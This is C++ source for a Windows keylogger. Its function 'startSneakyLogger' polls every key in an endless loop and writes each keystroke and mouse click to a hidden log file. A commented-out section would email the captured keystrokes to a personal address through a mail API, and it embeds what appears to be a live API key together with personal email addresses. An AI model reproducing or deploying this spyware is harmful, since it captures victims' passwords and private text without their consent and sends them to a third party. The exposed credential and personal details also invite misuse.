#include "KeyLogger.h"

using std::string;
using rapidjson::StringRef;

string bufferString;

void writeToLog(LPCSTR text, std::wstring outFilePath) {
    std::ofstream logfile;
    logfile.open(outFilePath, std::fstream::app);
    logfile << text;
    bufferString += text;
    logfile.close();
}
bool KeyIsListened(int iKey, std::wstring outFilePath) {
    switch (iKey) {
    case VK_SPACE:
        writeToLog(" ", outFilePath);
        break;
    case VK_RETURN:
        writeToLog("\n", outFilePath);
        break;
    case VK_SHIFT:
        writeToLog(" *shift* ", outFilePath);
        break;
    case VK_BACK:
        writeToLog("\b", outFilePath);
        break;
    case VK_RBUTTON:
        writeToLog(" *rclick* ", outFilePath);
        break;
    case VK_LBUTTON:
        writeToLog(" *lclick* ", outFilePath);
        break;
    default: return false;
    }
}



void startSneakyLogger() {
    unsigned char key;
    std::wstring outFilePath = getOutFolder() + L"\\keylogs.txt";
    while (1)
    {
        Sleep(10);
        for (key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                if (!KeyIsListened(key, outFilePath))
                {
                    std::ofstream logfile;
                    logfile.open(outFilePath, std::fstream::app);
                    bufferString += key;
                    logfile << key;
                    logfile.close();
                    /*if (bufferString.size() > 150)
                    {
                        sendBuffer();
                        bufferString.clear();
                    }*/
                }
            }
        }
    }
}

//rapidjson::StringBuffer createJsonData() {
//    rapidjson::Document d;
//
//    d.SetObject();
//
//    rapidjson::Document::AllocatorType& allocator = d.GetAllocator();
//
//    rapidjson::Value sender(rapidjson::kObjectType);
//    sender.AddMember("name", "Voornaam Achternaam", allocator);
//    sender.AddMember("email", "email@email.com", allocator);
//
//    rapidjson::Value contacts(rapidjson::kArrayType);
//
//    contacts.SetArray();
//
//    rapidjson::Value to(rapidjson::kObjectType);
//    to.AddMember("email", "arnecools@hotmail.com", allocator);
//    to.AddMember("name", "Arne cools", allocator);
//
//    contacts.PushBack(to, allocator);
//
//    rapidjson::Value replyTo(rapidjson::kObjectType);
//    replyTo.AddMember("email", "arnecools96@gmail.com", allocator);
//    replyTo.AddMember("name", "Arne Cools", allocator);
//    rapidjson::Value s;
//    s.SetString(StringRef(bufferString.c_str()));
//    d.AddMember("sender", sender, allocator);
//    d.AddMember("to", contacts, allocator);
//    d.AddMember("htmlContent", s, allocator);
//    d.AddMember("subject", "Test logger data", allocator);
//    d.AddMember("replyTo", replyTo, allocator);
//
//    rapidjson::StringBuffer buffer;
//    rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
//    d.Accept(writer);
//
//    std::cout << "Buffer send" << std::endl;
//    return buffer;
//}
//
//void sendBuffer() {
//    rapidjson::StringBuffer buffer = createJsonData();
//
//    CURL* curl;
//    CURLcode res;
//
//    curl_global_init(CURL_GLOBAL_ALL);
//
//    curl = curl_easy_init();
//    if (curl) {
//        struct curl_slist* headerlist = NULL;
//        curl = curl_easy_init();
//
//        headerlist = curl_slist_append(headerlist, "api-key: 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");
//        headerlist = curl_slist_append(headerlist, "Accept: application/json");
//        headerlist = curl_slist_append(headerlist, "Content-Type: application/json");
//        headerlist = curl_slist_append(headerlist, "charsets: utf-8");
//
//        curl_easy_setopt(curl, CURLOPT_URL, "https://api.sendinblue.com/v3/smtp/email");
//        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
//
//        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buffer.GetString());
//
//
//        res = curl_easy_perform(curl);
//
//        if (res != CURLE_OK)
//            fprintf(stderr, "curl_easy_perform() failed: %s\n",
//                curl_easy_strerror(res));
//
//        curl_easy_cleanup(curl);
//    }
//    curl_global_cleanup();
//}